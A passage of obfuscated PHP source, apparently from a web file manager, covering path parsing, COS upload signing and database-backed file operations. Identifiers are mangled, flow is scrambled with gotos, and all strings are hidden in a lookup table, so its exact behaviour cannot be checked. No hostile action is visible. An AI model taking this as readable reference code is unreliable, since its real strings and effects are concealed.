"\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\163\x65\x72\x52\145\156\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\x76\145\x72\175"; public static function typeList() { $b‹Üæ®İ¼¯ =& $_SERVER[Äº¡•ô™Ÿ]; return array($b‹Üæ®İ¼¯[1050] => self::KOD_SOURCE, $b‹Üæ®İ¼¯[1051] => self::KOD_USER_RECYCLE, $b‹Üæ®İ¼¯[1052] => self::KOD_USER_FAV, $b‹Üæ®İ¼¯[1053] => self::KOD_USER_FILE_TAG, $b‹Üæ®İ¼¯[1054] => self::KOD_USER_FILE_TYPE, $b‹Üæ®İ¼¯[1055] => self::KOD_GROUP_ROOT_SELF, $b‹Üæ®İ¼¯[1056] => self::KOD_USER_SHARE, $b‹Üæ®İ¼¯[1057] => self::KOD_USER_SHARE_LINK, $b‹Üæ®İ¼¯[1058] => self::KOD_USER_SHARE_TO_ME, $b‹Üæ®İ¼¯[1059] => self::KOD_SHARE_ITEM, $b‹Üæ®İ¼¯[1060] => self::KOD_SHARE_LINK, $b‹Üæ®İ¼¯[1061] => self::KOD_SEARCH, $b‹Üæ®İ¼¯[1062] => self::KOD_BLOCK, $b‹Üæ®İ¼¯[1063] => self::KOD_IO, $b‹Üæ®İ¼¯[1064] => self::KOD_USER_RECENT, $b‹Üæ®İ¼¯[1065] => self::KOD_USER_DRIVER); } public static function parse($D‘‰ÇÈÑóõ) { goto bïçèÂ…Ó‚; eµŞ°Øğä: $a÷£¼øÍ = array($Bô–Èâó´”[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $AÅÛÍ¥½‘–[$Bô–Èâó´”[1070]] = in_array($AÅÛÍ¥½‘–[$Bô–Èâó´”[29]], $a÷£¼øÍ); return $AÅÛÍ¥½‘–; goto C¥ğÍ«à…À; AÌª×»¶Ù°: preg_match($Bô–Èâó´”[1066], $D‘‰ÇÈÑóõ, $eµ„ù¼™Ò²); $AÅÛÍ¥½‘– = array($Bô–Èâó´”[385] => !1, $Bô–Èâó´”[1067] => !1, $Bô–Èâó´”[382] => !1, $Bô–Èâó´”[75] => $D‘‰ÇÈÑóõ, $Bô–Èâó´”[1012] => !1, $Bô–Èâó´”[1011] => $Bô–Èâó´”[33]); if (is_array($eµ„ù¼™Ò²) && count($eµ„ù¼™Ò²) == 5) { $b¿òÎ”ŠÖ = $Bô–Èâó´”[1068] . $eµ„ù¼™Ò²[2] . $Bô–Èâó´”[312]; if (in_array($b¿òÎ”ŠÖ, $d´ÚÄòß¾Ÿ)) { $AÅÛÍ¥½‘–[$Bô–Èâó´”[1012]] = $eµ„ù¼™Ò²[1]; $AÅÛÍ¥½‘–[$Bô–Èâó´”[29]] = $b¿òÎ”ŠÖ; $AÅÛÍ¥½‘–[$Bô–Èâó´”[1069]] = substr($b¿òÎ”ŠÖ, 1, -1); $AÅÛÍ¥½‘–[$Bô–Èâó´”[364]] = $eµ„ù¼™Ò²[3]; } $AÅÛÍ¥½‘–[$Bô–Èâó´”[1011]] = $eµ„ù¼™Ò²[4]; } goto eµŞ°Øğä; bïçèÂ…Ó‚: $Bô–Èâó´” =& $_SERVER[Äº¡•ô™Ÿ]; $D‘‰ÇÈÑóõ = self::clear($D‘‰ÇÈÑóõ); $d´ÚÄòß¾Ÿ = array_values(self::typeList()); goto AÌª×»¶Ù°; C¥ğÍ«à…À: } public static function clear($a‡ø“ÁæšÉ) { goto e¥œ±œƒ ; e¥œ±œƒ : $d’Å±ì´¬Ò =& $_SERVER[Äº¡•ô™Ÿ]; $a‡ø“ÁæšÉ = str_replace($d’Å±ì´¬Ò[95], $d’Å±ì´¬Ò[8], $a‡ø“ÁæšÉ); $DÊ„ò–±† = $d’Å±ì´¬Ò[1071]; goto dƒ…©×; dƒ…©×: if (substr($a‡ø“ÁæšÉ, 0, 3) == $d’Å±ì´¬Ò[1072]) { $a‡ø“ÁæšÉ = substr($a‡ø“ÁæšÉ, 3); } while (strstr($a‡ø“ÁæšÉ, $DÊ„ò–±†)) { $a‡ø“ÁæšÉ = str_replace($DÊ„ò–±†, $d’Å±ì´¬Ò[8], $a‡ø“ÁæšÉ); } $a‡ø“ÁæšÉ = preg_replace($d’Å±ì´¬Ò[1073], $d’Å±ì´¬Ò[8], $a‡ø“ÁæšÉ); goto C‰·ŸÀÎóë; C‰·ŸÀÎóë: if ($a‡ø“ÁæšÉ == $d’Å±ì´¬Ò[8]) { return $d’Å±ì´¬Ò[8]; } $a‡ø“ÁæšÉ = rtrim($a‡ø“ÁæšÉ, $d’Å±ì´¬Ò[8]); return $a‡ø“ÁæšÉ; goto a©ù¹ôœ•¡; a©ù¹ôœ•¡: } public static function sourceID($AƒËĞ‡Ø°) { $EÅñÊè®ìŠ =& $_SERVER[Äº¡•ô™Ÿ]; $FÕ‰”Ê¡ç  = self::parse($AƒËĞ‡Ø°); if ($FÕ‰”Ê¡ç [$EÅñÊè®ìŠ[29]] !== self::KOD_SOURCE) { show_json(LNG($EÅñÊè®ìŠ[1074]), !1); } return $FÕ‰”Ê¡ç [$EÅñÊè®ìŠ[364]]; } public static function make($C÷´ÛÈåñÑ) { if (!$C÷´ÛÈåñÑ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($C÷´ÛÈåñÑ)); } public static function makeShare($D­Ô÷†±ƒó, $a¦Ü‹¼Ò¯) { return self::makePath(self::KOD_SHARE_ITEM, $D­Ô÷†±ƒó, $a¦Ü‹¼Ò¯); } public static function makeFileTypePath($bÙÒ½Â œŞ) { return self::makePath(self::KOD_USER_FILE_TYPE, $bÙÒ½Â œŞ); } public static function makeFileTagPath($AŠéêŠàŠ) { return self::makePath(self::KOD_USER_FILE_TAG, $AŠéêŠàŠ); } public static function makePath($C¤ì¼ã’é, $fïÓŒ½‡È = '', $FÑà„¹ÃÅ = '') { $d¨èİ„‹Å³ =& $_SERVER[Äº¡•ô™Ÿ]; $cŸß±àÁ = substr($C¤ì¼ã’é, 1, -1); $fä„ÆÂÛ§í = $d¨èİ„‹Å³[1075] . $cŸß±àÁ . $d¨èİ„‹Å³[1076] . $fïÓŒ½‡È . $d¨èİ„‹Å³[1077]; $fä„ÆÂÛ§í = $FÑà„¹ÃÅ ? $fä„ÆÂÛ§í . $FÑà„¹ÃÅ . $d¨èİ„‹Å³[8] : $fä„ÆÂÛ§í; return $fä„ÆÂÛ§í; } public static function hashPath($AŒ½ìÌÌ­ƒ) { $d¢‡«§É†ğ =& $_SERVER[Äº¡•ô™Ÿ]; $f¨Ÿá‹„± = is_array($AŒ½ìÌÌ­ƒ) ? $AŒ½ìÌÌ­ƒ : IO::info($AŒ½ìÌÌ­ƒ); $FÌ–ÌÊÇ“˜ = _get($f¨Ÿá‹„±, $d¢‡«§É†ğ[1078], $d¢‡«§É†ğ[33]); if (!$FÌ–ÌÊÇ“˜) { $c¹Äí¿´´‹ = KodIO::parse($f¨Ÿá‹„±[$d¢‡«§É†ğ[75]]); if (!$c¹Äí¿´´‹[$d¢‡«§É†ğ[29]]) { $FÌ–ÌÊÇ“˜ = IO::hashSimple($f¨Ÿá‹„±[$d¢‡«§É†ğ[75]]); } } if (!$FÌ–ÌÊÇ“˜) { $FÌ–ÌÊÇ“˜ = md5($f¨Ÿá‹„±[$d¢‡«§É†ğ[75]] . $f¨Ÿá‹„±[$d¢‡«§É†ğ[77]] . $f¨Ÿá‹„±[$d¢‡«§É†ğ[107]]); } return $FÌ–ÌÊÇ“˜; } public static function initSystemPath() { $Aºğ›½Ÿ´ =& $_SERVER[Äº¡•ô™Ÿ]; if (defined($Aºğ›½Ÿ´[1079])) { return; } define($Aºğ›½Ÿ´[1079], self::systemPath($Aºğ›½Ÿ´[1080])); define($Aºğ›½Ÿ´[1081], self::systemPath($Aºğ›½Ÿ´[1082])); define($Aºğ›½Ÿ´[1083], self::systemPath($Aºğ›½Ÿ´[1084])); define($Aºğ›½Ÿ´[1085], self::systemPath($Aºğ›½Ÿ´[1086])); } private static function systemPath($a÷Ëİ¥ƒº¾) { goto d‰÷‡·ê×î; eñ¯ãˆğ«: if ($e›­’Œ¨Û) { return $e›­’Œ¨Û; } if ($a÷Ëİ¥ƒº¾ == $eÅœÒâ‡Üè[1080]) { $e›­’Œ¨Û = self::make(Model($eÅœÒâ‡Üè[755])->systemRootPathAdd($eÅœÒâ‡Üè[1089])); } else { $e›­’Œ¨Û = self::systemPath($eÅœÒâ‡Üè[1080]); $AàÑÓ•’¿Å = self::sourceID($e›­’Œ¨Û); $e›­’Œ¨Û = self::make(Model($eÅœÒâ‡Üè[755])->mkdir($AàÑÓ•’¿Å, $a÷Ëİ¥ƒº¾)); } Model($eÅœÒâ‡Üè[1088])->set($e”Ö…ßçœÁ, $e›­’Œ¨Û); goto E‰™êøÍ¦™; d‰÷‡·ê×î: $eÅœÒâ‡Üè =& $_SERVER[Äº¡•ô™Ÿ]; $e”Ö…ßçœÁ = $eÅœÒâ‡Üè[1087] . ucfirst($a÷Ëİ¥ƒº¾); $e›­’Œ¨Û = Model($eÅœÒâ‡Üè[1088])->get($e”Ö…ßçœÁ); goto eñ¯ãˆğ«; E‰™êøÍ¦™: return $e›­’Œ¨Û; goto D²‡æªŞÂ; D²‡æªŞÂ: } public static function systemFolder($DêÍíï‡…) { $AÕ“ï‘ÅÛ = IO_PATH_SYSTEM_SOURCE . $DêÍíï‡…; $d¿·£Ó«Å = Cache::get($AÕ“ï‘ÅÛ); if (!$d¿·£Ó«Å) { $b—ÖË´åô¢ = IO::infoFull($AÕ“ï‘ÅÛ); if (!$b—ÖË´åô¢) { $d¿·£Ó«Å = IO::mkdir($AÕ“ï‘ÅÛ, REPEAT_SKIP); } else { $d¿·£Ó«Å = $b—ÖË´åô¢[$_SERVER[Äº¡•ô™Ÿ][75]]; } Cache::set($AÕ“ï‘ÅÛ, $d¿·£Ó«Å, 3600 * 10); } return $d¿·£Ó«Å; } public static function defaultDriver() { return Model($_SERVER[Äº¡•ô™Ÿ][707])->defaultDriver(); } public static function defaultIO() { $A¶×œººÉŒ =& $_SERVER[Äº¡•ô™Ÿ]; $C÷šİßöñ— = self::defaultDriver(); return $A¶×œººÉŒ[1090] . $C÷šİßöñ—[$A¶×œººÉŒ[364]] . $A¶×œººÉŒ[1077]; } public static function fileTypeList() { $B©•…¿ƒ“ =& $_SERVER[Äº¡•ô™Ÿ]; $f¡ŞÔóÌ» = $GLOBALS[$B©•…¿ƒ“[6]][$B©•…¿ƒ“[1091]]; foreach ($f¡ŞÔóÌ» as $d©º‘Ò©¾ => $C‡æá™ ) { $eŞÀ²í‘÷— = $B©•…¿ƒ“[1092] . $d©º‘Ò©¾; $d¹‰Š°Ûè = LNG($eŞÀ²í‘÷—); if ($eŞÀ²í‘÷— != $d¹‰Š°Ûè) { $f¡ŞÔóÌ»[$d©º‘Ò©¾][$B©•…¿ƒ“[28]] = $d¹‰Š°Ûè; } } return $f¡ŞÔóÌ»; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($eœ¦ª ¬¡º) { parent::__construct($eœ¦ª ¬¡º); $this->signatureVersion($_SERVER[Äº¡•ô™Ÿ][197]); } public function uploadFormData($FÛóô¯Ò, $AøŸ÷‘»ºÄ = 3600) { goto A¶š°×ñÈó; DÎ‡ÉŠò‘: return $FäáŞ¬Û ; goto fè¨ŒËÏ§”; DÊã¤‹Â…¬: $cÔ—Ü£æ§À = $fÒ‹Í±ª[1093]; $F¹µÍ–’¾Î = gmdate($fÒ‹Í±ª[1094], time() + $AøŸ÷‘»ºÄ); $bà¨£°İ»Í = (string) time() . $fÒ‹Í±ª[67] . (string) (time() + $AøŸ÷‘»ºÄ); goto BŠ¾ë…Òñ; EˆŒî¯—¥Œ: $B“ŠëÏß¨Ù = sha1($Aù÷Ú¶´š¬); $dòö®ë¿İ˜ = hash_hmac($fÒ‹Í±ª[215], $B“ŠëÏß¨Ù, $e©Ã£µ›¡æ); $FäáŞ¬Û  = array($fÒ‹Í±ª[1097] => $DìÖ¡ù˜Èó, $fÒ‹Í±ª[1101] => $cÔ—Ü£æ§À, $fÒ‹Í±ª[1105] => base64_encode($Aù÷Ú¶´š¬), $fÒ‹Í±ª[1102] => $ağ¨”ÏÕİñ, $fÒ‹Í±ª[1103] => $this->accessKey, $fÒ‹Í±ª[1106] => $bà¨£°İ»Í, $fÒ‹Í±ª[1107] => $dòö®ë¿İ˜, $fÒ‹Í±ª[166] => $this->getHost()); goto DÎ‡ÉŠò‘; A¶š°×ñÈó: $fÒ‹Í±ª =& $_SERVER[Äº¡•ô™Ÿ]; $DìÖ¡ù˜Èó = $fÒ‹Í±ª[182]; $ağ¨”ÏÕİñ = $fÒ‹Í±ª[215]; goto DÊã¤‹Â…¬; BŠ¾ë…Òñ: $Aù÷Ú¶´š¬ = array($fÒ‹Í±ª[1095] => $F¹µÍ–’¾Î, $fÒ‹Í±ª[1096] => array(array($fÒ‹Í±ª[1097] => $DìÖ¡ù˜Èó), array($fÒ‹Í±ª[1098] => $this->bucket), array($fÒ‹Í±ª[1099], $fÒ‹Í±ª[1100], $fÒ‹Í±ª[33]), array($fÒ‹Í±ª[1101] => $cÔ—Ü£æ§À), array($fÒ‹Í±ª[1102] => $ağ¨”ÏÕİñ), array($fÒ‹Í±ª[1103] => $this->accessKey), array($fÒ‹Í±ª[1104] => $bà¨£°İ»Í))); $Aù÷Ú¶´š¬ = json_encode($Aù÷Ú¶´š¬); $e©Ã£µ›¡æ = hash_hmac($fÒ‹Í±ª[215], $bà¨£°İ»Í, $this->secret); goto EˆŒî¯—¥Œ; fè¨ŒËÏ§”: } public function fileOutLink($EÒº—‚“) { $e©æ´‹©Ñ± =& $_SERVER[Äº¡•ô™Ÿ]; if (substr($EÒº—‚“, 0, 7) == $e©æ´‹©Ñ±[1108]) { $EÒº—‚“ = $e©æ´‹©Ñ±[1109] . substr($EÒº—‚“, 7); } header($e©æ´‹©Ñ±[153] . $EÒº—‚“); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($b¾†âŸ­êÁ) { $this->pathParse = $b¾†âŸ­êÁ; $this->model = Model($_SERVER[Äº¡•ô™Ÿ][1110]); } public function getPath($F×›‹ŞÛé) { return trim($F×›‹ŞÛé, $_SERVER[Äº¡•ô™Ÿ][8]); } public function pathFather($Aë¡—ç) { $BÆÚñö¹Ê = $this->parse($Aë¡—ç); $BÆÚñö¹Ê = $this->infoSimple($Aë¡—ç); return $BÆÚñö¹Ê ? $BÆÚñö¹Ê[$_SERVER[Äº¡•ô™Ÿ][457]] : !1; } public function getPathName($d“Ş²¾ŒìŒ) { $fÖ™ŞÂ¨…• = $this->infoSimple($d“Ş²¾ŒìŒ); return $fÖ™ŞÂ¨…• ? $fÖ™ŞÂ¨…•[$_SERVER[Äº¡•ô™Ÿ][28]] : !1; } public function getPathOuter($e…›­Âµ³) { if (!$e…›­Âµ³) { return $e…›­Âµ³; } $D‘à¯‘ÃÇ¡ = $this->parse($e…›­Âµ³); return KodIO::make($D‘à¯‘ÃÇ¡[$_SERVER[Äº¡•ô™Ÿ][364]]); } public function copyFolderFromIO($cµìÉÀ£‹, $e‰£›‘êÕæ, $D×™Ì‘¦Ê, $D‡•·Ï†Êá, $E ×ôîÎ¾ ) { $eĞ‚¯¾ËÊ = $this->model->copyFolderFromIO($cµìÉÀ£‹, $e‰£›‘êÕæ, $D×™Ì‘¦Ê, $D‡•·Ï†Êá, $E ×ôîÎ¾ ); return KodIO::make($eĞ‚¯¾ËÊ); } public function isParentOf($e³«Áœ¸©Å, $b¢½‰‚³‡¸) { return $this->model->isParentOf($e³«Áœ¸©Å, $b¢½‰‚³‡¸); } public function mkfile($bâè·çƒÚö, $f‰ã‹ÔÅˆ = '', $Fî¼ºŠù¹Û = REPEAT_RENAME) { $D¤ŞÕ„ã¦œ =& $_SERVER[Äº¡•ô™Ÿ]; $CöŞ–çå… = $this->parse($bâè·çƒÚö); $bâè·çƒÚö = $CöŞ–çå…[$D¤ŞÕ„ã¦œ[364]]; for ($aœÈæ³»ºÔ = 0; $aœÈæ³»ºÔ < count($CöŞ–çå…[$D¤ŞÕ„ã¦œ[1111]]); $aœÈæ³»ºÔ++) { $fâ©Æ¿‘¥ï = $CöŞ–çå…[$D¤ŞÕ„ã¦œ[1111]][$aœÈæ³»ºÔ]; if ($aœÈæ³»ºÔ == count($CöŞ–çå…[$D¤ŞÕ„ã¦œ[1111]]) - 1) { $bâè·çƒÚö = $this->model->mkfile($bâè·çƒÚö, $fâ©Æ¿‘¥ï, $f‰ã‹ÔÅˆ, $Fî¼ºŠù¹Û); break; } $bâè·çƒÚö = $this->model->mkdir($bâè·çƒÚö, $fâ©Æ¿‘¥ï, REPEAT_SKIP); } return $this->getPathOuter($bâè·çƒÚö); } public function mkdir($Fº†ïîÔäº, $b­îÈŠïÌË = REPEAT_SKIP) { $eœ¼æ‘ =& $_SERVER[Äº¡•ô™Ÿ]; $dë»ëÈŠè“ = $this->parse($Fº†ïîÔäº); $Fº†ïîÔäº = $dë»ëÈŠè“[$eœ¼æ‘[364]]; for ($f÷‹ºòĞÙ¨ = 0; $f÷‹ºòĞÙ¨ < count($dë»ëÈŠè“[$eœ¼æ‘[1111]]); $f÷‹ºòĞÙ¨++) { $bÃìîÜ–ã = $dë»ëÈŠè“[$eœ¼æ‘[1111]][$f÷‹ºòĞÙ¨]; $Fº†ïîÔäº = $this->model->mkdir($Fº†ïîÔäº, $bÃìîÜ–ã, $b­îÈŠïÌË); } return $this->getPathOuter($Fº†ïîÔäº); } public function copyFile($dï–‡Â¯ğ¾, $d¹Ú¸·Û‰, $e½¥ëßÇÙ = REPEAT_REPLACE) { $fİŸ¦¥šœß =& $_SERVER[Äº¡•ô™Ÿ]; $CïÊ‹Öèµ = $this->parse($d¹Ú¸·Û‰); $AÀ©çâ÷ò = $this->model->copy($dï–‡Â¯ğ¾, $CïÊ‹Öèµ[$fİŸ¦¥šœß[364]], $e½¥ëßÇÙ, $CïÊ‹Öèµ[$fİŸ¦¥šœß[75]]); return $AÀ©çâ÷ò ? $this->getPathOuter($AÀ©çâ÷ò) : !1; } public function moveFile($Eëº¬¤Æ°¥, $b“ÏĞÎäó, $cÜ­·¤Ñ·ä = REPEAT_REPLACE) { $Dß‡áñø× =& $_SERVER[Äº¡•ô™Ÿ]; $E÷•œç×Æ = $this->parse($b“ÏĞÎäó); $eºŞù÷Áœñ = $this->model->move($Eëº¬¤Æ°¥, $E÷•œç×Æ[$Dß‡áñø×[364]], $cÜ­·¤Ñ·ä, $E÷•œç×Æ[$Dß‡áñø×[75]]); return $eºŞù÷Áœñ ? $this->getPathOuter($eºŞù÷Áœñ) : !1; } public function copy($b¯¹Œ¯é, $eŒ»²¬’•, $aÁ©ÏÏ‰• = REPEAT_REPLACE) { $e½íòÒ½Š = $this->parse($eŒ»²¬’•); $eä‡êİ†Æå = $this->model->copy($b¯¹Œ¯é, $e½íòÒ½Š[$_SERVER[Äº¡•ô™Ÿ][364]], $aÁ©ÏÏ‰•); return $eä‡êİ†Æå ? $this->getPathOuter($eä‡êİ†Æå) : !1; } public function move($bï¿Ìğâ‹, $bôœ¸ĞŠÒ“, $cµóàìÜ = REPEAT_REPLACE) { $bœ‰Àµ’š¯ = $this->parse($bôœ¸ĞŠÒ“); $eœêÌ¬ôåÛ = $this->model->move($bï¿Ìğâ‹, $bœ‰Àµ’š¯[$_SERVER[Äº¡•ô™Ÿ][364]], $cµóàìÜ); return $eœêÌ¬ôåÛ ? $this->getPathOuter($eœêÌ¬ôåÛ) : !1; } public function remove($fŸÄÊ±µ£‚, $dÎ¦ÄñÕó³ = true) { return $this->model->remove($fŸÄÊ±µ£‚, $dÎ¦ÄñÕó³); } public function rename($F‰Øå˜„³Ë, $F‹·ÈßåÅá) { $D¿ÒÁï“² = $this->model->rename($F‰Øå˜„³Ë, $F‹·ÈßåÅá); return $D¿ÒÁï“² ? $this->getPathOuter($F‰Øå˜„³Ë) : $D¿ÒÁï“²; } public function size($AïçøŸ‡™Ô) { $B…—œ“ïÒ = $this->infoSimple($AïçøŸ‡™Ô); return $B…—œ“ïÒ ? $B…—œ“ïÒ[$_SERVER[Äº¡•ô™Ÿ][77]] : 0; } public function infoSimple($f±¦À »ôò) { return $this->model->sourceInfo($f±¦À »ôò); } public function info($c™÷×ªîåÙ) { return $this->infoParse($c™÷×ªîåÙ); } public function infoAuth($bíÕ×«Îòİ) { return $this->infoParse($bíÕ×«Îòİ, !1, !0); } public function infoWithChildren($FÉĞ¯ÕÈ) { return $this->infoParse($FÉĞ¯ÕÈ, !0); } protected function infoParse($càİ÷Ñ‘ç„, $AÍàæ¹‘ ÷ = false, $Aç…ˆŒçÂœ = false) { if (!$AÍàæ¹‘ ÷) { return $this->model->pathInfo($càİ÷Ñ‘ç„, $Aç…ˆŒçÂœ); } return $this->model->pathInfoMore($càİ÷Ñ‘ç„); } public function infoFull($C×ç¤İÕ‚Û) { $F™Š±©Ô =& $_SERVER[Äº¡•ô™Ÿ]; $fõ ãÖ«Ãš = explode($F™Š±©Ô[8], $C×ç¤İÕ‚Û); $aÜÎ·…å‚Ë = implode($F™Š±©Ô[8], array_splice($fõ ãÖ«Ãš, 1)); return $this->model->pathInfoByPath($fõ ãÖ«Ãš[0], $aÜÎ·…å‚Ë); } public function hashSimple($aùò›øÛÈÚ) { $CÁó¢‚­Š… =& $_SERVER[Äº¡•ô™Ÿ]; $BîñÓ•Ù†Ğ = $this->infoWithChildren($aùò›øÛÈÚ); return $BîñÓ•Ù†Ğ[$CÁó¢‚­Š…[159]][$CÁó¢‚­Š…[161]]; } public function hashMd5($a‹¿«Ö§„“) { $fŠÁÙ¹­²Û =& $_SERVER[Äº¡•ô™Ÿ]; $aá„ãßÙÇÅ = $this->infoWithChildren($a‹¿«Ö§„“); return $aá„ãßÙÇÅ[$fŠÁÙ¹­²Û[159]][$fŠÁÙ¹­²Û[160]]; } public function exist($dÅ·Ú–¯ÔÊ) { $BæµÎ×…æÊ =& $_SERVER[Äº¡•ô™Ÿ]; $BÅÉ¶’ Õ = $this->parse($dÅ·Ú–¯ÔÊ); if (!$BÅÉ¶’ Õ[$BæµÎ×…æÊ[75]]) { return $this->isFile($dÅ·Ú–¯ÔÊ) || $this->isFolder($dÅ·Ú–¯ÔÊ); } $CÏ‘ÑŒ¿ÌÇ = array($BæµÎ×…æÊ[365] => $BÅÉ¶’ Õ[$BæµÎ×…æÊ[364]], $BæµÎ×…æÊ[28] => $BÅÉ¶’ Õ[$BæµÎ×…æÊ[75]]); $a‡ÆÌÜ÷ = $this->model->where($CÏ‘ÑŒ¿ÌÇ)->find(); return $a‡ÆÌÜ÷ ? !0 : !1; } public function isFile($AÇÕÎî»µ) { $e§–£Î¾ö =& $_SERVER[Äº¡•ô™Ÿ]; $c­šáÚ“Ë£ = $this->infoSimple($AÇÕÎî»µ); return $c­šáÚ“Ë£ && $c­šáÚ“Ë£[$e§–£Î¾ö[367]] == $e§–£Î¾ö[83] ? !1 : !0; } public function isFolder($fÚø‘ÎùÁ) { $FÎÑŒ«…Ï =& $_SERVER[Äº¡•ô™Ÿ]; $dä†·‚ùÒ‘ = $this->infoSimple($fÚø‘ÎùÁ); return $dä†·‚ùÒ‘ && $dä†·‚ùÒ‘[$FÎÑŒ«…Ï[367]] == $FÎÑŒ«…Ï[83] ? !0 : !1; } public function listPath($EÒ×í”ïí™, $B½ß¡«‚ï‡ = false) { $D¤» ¨ãÑ¨ =& $_SERVER[Äº¡•ô™Ÿ]; if ($EÒ×í”ïí™ == $D¤» ¨ãÑ¨[33]) { return !1; } $c›ÇÉ’›¡¯ = array($D¤» ¨ãÑ¨[365] => $EÒ×í”ïí™); if ($B½ß¡«‚ï‡) { return $this->model->listSource($c›ÇÉ’›¡¯, -1); } return $this->model->listSource($c›ÇÉ’›¡¯); } public function has($d­Şà‹ÚŠ, $AöèíÆãô = false, $b±ê‘Ø×Ãá = null) { $béÌº×ÒÀŞ =& $_SERVER[Äº¡•ô™Ÿ]; $EÊÂì„ñ ‰ = $this->infoWithChildren($d­Şà‹ÚŠ); if ($AöèíÆãô) { return array($béÌº×ÒÀŞ[189] => $EÊÂì„ñ ‰[$béÌº×ÒÀŞ[189]], $béÌº×ÒÀŞ[188] => $EÊÂì„ñ ‰[$béÌº×ÒÀŞ[188]]); } return $b±ê‘Ø×Ãá ? $EÊÂì„ñ ‰[$béÌº×ÒÀŞ[189]] : $EÊÂì„ñ ‰[$béÌº×ÒÀŞ[188]]; } public function listAll($BÌ‡É‰¹Şğ) { $bíÃã§Àßˆ = IO::info($this->pathParse[$_SERVER[Äº¡•ô™Ÿ][75]]); if (!$bíÃã§Àßˆ) { return array(); } return $this->model->listAll($BÌ‡É‰¹Şğ); } public function getContent($A³‘¹áÔÇ) { return $this->model->getContent($A³‘¹áÔÇ); } public function setContent($d·–¦‡¢Ù, $Eƒ¨¢¶¿Ë¶ = '') { return $this->model->setContent($d·–¦‡¢Ù, $Eƒ¨¢¶¿Ë¶); } public function fileSubstr($FÈÔ‡ĞœÊ, $A®â…Ôğğï, $C‚ÌÄæÕŸ) { return $this->model->fileSubstr($FÈÔ‡ĞœÊ, $A®â…Ôğğï, $C‚ÌÄæÕŸ); } public function download($e×ó½‚ë¥÷, $DÒÀ¦²»Üø = '') { $CÀ¿‘±Êœ¤ = get_path_father($DÒÀ¦²»Üø); $f’á˜Ûå = get_path_this($DÒÀ¦²»Üø); $AšÍÉœÅƒÊ = $this->model->fileInfoGet($e×ó½‚ë¥÷); $dİÉƒµï = IO::copy($AšÍÉœÅƒÊ[$_SERVER[Äº¡•ô™Ÿ][75]], $CÀ¿‘±Êœ¤, !1, $f’á˜Ûå); return $dİÉƒµï; } public function upload($E‘ò±ÍÜ”™, $DÍÀ´³ñ, $d»ãïŸˆÊğ = false, $DÜæ½ï = REPEAT_REPLACE) { $DÔ‘Ò“‡® =& $_SERVER[Äº¡•ô™Ÿ]; $f×‚‡£Á‘ã = $this->parse($E‘ò±ÍÜ”™); $Dè®á…¹¯ = $this->model->addFile($f×‚‡£Á‘ã[$DÔ‘Ò“‡®[364]], $DÍÀ´³ñ, $f×‚‡£Á‘ã[$DÔ‘Ò“‡®[75]], $d»ãïŸˆÊğ, $DÜæ½ï); return $this->getPathOuter($Dè®á…¹¯); } public function uploadFileByID($D›»âíŞï¦, $aÓöï’å  , $EÓÂ§²„·ä) { $A‹æ¨·Åé‰ =& $_SERVER[Äº¡•ô™Ÿ]; $EÁ•àº²éÆ = $this->parse($D›»âíŞï¦); $B©°«ÖÌ¹ = $this->model->addFileByFileID($EÁ•àº²éÆ[$A‹æ¨·Åé‰[364]], $aÓöï’å  , $EÁ•àº²éÆ[$A‹æ¨·Åé‰[75]], $EÓÂ§²„·ä); return $this->getPathOuter($B©°«ÖÌ¹); } public function addFileByRemote($dÍçĞ†¦„­, $e¡‚í„Ï©è, $C±¹ÚË­Ò = array(), $b£¤¹–ÅåÑ = '', $aÔÙŞİ³„”) { $Dß‡ñŒ£õÚ =& $_SERVER[Äº¡•ô™Ÿ]; $Bìãí×ÉÂ = $this->parse($dÍçĞ†¦„­); $b£¤¹–ÅåÑ = empty($b£¤¹–ÅåÑ) ? $Bìãí×ÉÂ[$Dß‡ñŒ£õÚ[75]] : $b£¤¹–ÅåÑ; $Eš¦™¼´© = $this->model->addFileByRemote($Bìãí×ÉÂ[$Dß‡ñŒ£õÚ[364]], $e¡‚í„Ï©è, $b£¤¹–ÅåÑ, $C±¹ÚË­Ò, $aÔÙŞİ³„”); return $this->getPathOuter($Eš¦™¼´©); } public function uploadLink($Ašéìï°‚», $AŒÈË•£¨ñ = 0) { $dº…‹æà¤ö =& $_SERVER[Äº¡•ô™Ÿ]; $E™ŠØ¬° = $this->parse($Ašéìï°‚»); $Ašéìï°‚» = Model($dº…‹æà¤ö[540])->createFileName($E™ŠØ¬°[$dº…‹æà¤ö[75]]); $fÏ¬÷Ä˜ª¼ = IO::uploadLink($Ašéìï°‚», $AŒÈË•£¨ñ); return $fÏ¬÷Ä˜ª¼; } public function fileNameAuto($Bš†öÅáŞª, $BÇ÷Ö„îÁŒ, $F†Åòá„‘ä = REPEAT_REPLACE, $eÉ‡óíê­ = false) { return $this->model->fileNameAuto($Bš†öÅáŞª, $BÇ÷Ö„îÁŒ, $F†Åòá„‘ä, $eÉ‡óíê­); } public function fileNameExist($a®«†Šõ¼ˆ, $fëÛƒ…øÔ†) { return $this->model->fileNameExist($a®«†Šõ¼ˆ, $fëÛƒ…øÔ†); } protected function _fileOut($BŸğä²é‘‚, $Aõ¡¬Ú‚ÌÁ = false, $Dß©ÔİĞ¤Ñ = false, $EÜ÷ë•Âø = '', $f×Š¸ŸÓõ = false) { goto eñ«™îÄƒ‚; eñ«™îÄƒ‚: $aÏ°‘¬ =& $_SERVER[Äº¡•ô™Ÿ]; $aö² ¼°Éµ = $this->model->sourceInfo($BŸğä²é‘‚); if ($aö² ¼°Éµ[$aÏ°‘¬[367]] == $aÏ°‘¬[83]) { header($aÏ°‘¬[1112]); die; } goto C¬¶É´–šÔ; C¬¶É´–šÔ: $a¨¦ùªÜâê = $this->model->fileInfoGet($BŸğä²é‘‚); $EÜ÷ë•Âø = $a¨¦ùªÜâê[$aÏ°‘¬[160]] ? $a¨¦ùªÜâê[$aÏ°‘¬[160]] : $EÜ÷ë•Âø; $D§İ‚ÓœõÔ = isset($GLOBALS[$aÏ°‘¬[1113]]) ? $GLOBALS[$aÏ°‘¬[1113]] : $aö² ¼°Éµ[$aÏ°‘¬[28]]; goto Eöò³÷ÌŸÇ; Eöò³÷ÌŸÇ: if 